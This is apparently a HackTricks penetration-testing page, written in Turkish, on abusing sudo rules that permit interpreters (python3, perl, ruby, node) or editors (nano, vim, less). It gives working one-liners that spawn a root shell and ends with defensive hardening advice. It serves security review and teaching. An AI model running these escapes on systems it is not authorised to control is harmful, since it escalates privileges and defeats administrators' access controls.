# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo-allowed interpreters

`sudo -l` bir kullanıcının bir interpreter'ı root olarak çalıştırmasına izin veriyorsa, bunu direct code execution olarak değerlendirin. Interpreter'lar arbitrary code çalıştırmak üzere tasarlanmıştır; bu nedenle `python3`, `perl`, `ruby`, `lua`, `node` veya benzer binary'lerin çalıştırılmasına izin veren bir kural, argümanlar sıkı şekilde sınırlandırılıp doğrulanmadığı sürece genellikle root command execution ile eşdeğerdir.

Common review flow:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Diğer interpreter örnekleri:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Tam yol önemlidir. sudo kuralı `/usr/bin/python3` kullanımına izin veriyorsa doğrulama sırasında tam olarak bu yolu kullanın:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo ile izin verilen editörler

`sudo -l`, bir kullanıcının root olarak interaktif bir editör çalıştırmasına izin veriyorsa bunu zararsız bir dosya düzenleme yetkisi olarak değil, command-execution yüzeyi olarak değerlendirin. Editörler genellikle shell komutlarını çalıştırabilir, rastgele dosyaları okuyabilir, rastgele dosyalara yazabilir veya editörün içinden harici yardımcıları çağırabilir.

Yaygın inceleme akışı:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

`nano` sudo üzerinden çalıştırılmasına izin verildiğinde, editor interface üzerinden command execution mümkün olabilir:
```text
Ctrl+R
Ctrl+X
```
Ardından şu şekilde bir komut sağlayın:
```bash
id
/bin/sh
```
Bazı terminallerde, etkileşimli bir shell'in standart akışlarının yeniden yönlendirilmesi gerekebilir:
```bash
reset; /bin/sh 1>&0 2>&0
```
Kesin tuş dizisi nano sürümüne ve derleme seçeneklerine göre değişebilir, ancak security issue aynıdır: editor root olarak çalışır ve harici komutları çalıştırabilir.

### Diğer yaygın editor escape'leri

Vim-style editor'ler genellikle `:!` üzerinden command execution özelliği sunar:
```text
:!/bin/sh
```
`less` gibi pager'lar da shell çalıştırmayı açığa çıkarabilir:
```text
!/bin/sh
```
## Defensive notes

- sudo üzerinden interpreters veya interactive editors yetkilendirmekten kaçının.
- Tek bir dar kapsamlı administrative action gerçekleştiren, root-owned sabit wrapper'ları tercih edin.
- Bir interpreter kaçınılmazsa exact script path'i kısıtlayın ve user-controlled arguments, writable imports, `PYTHONPATH` ile unsafe environment preservation kullanımını engelleyin.
- File editing gerekiyorsa exact file path'i kısıtlayın ve patched sudo versions ile strict environment handling kullanarak `sudoedit`'i değerlendirin.
- `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty` ve logging ayarlarını inceleyin; ancak bunları complete sandbox olarak değerlendirmeyin.
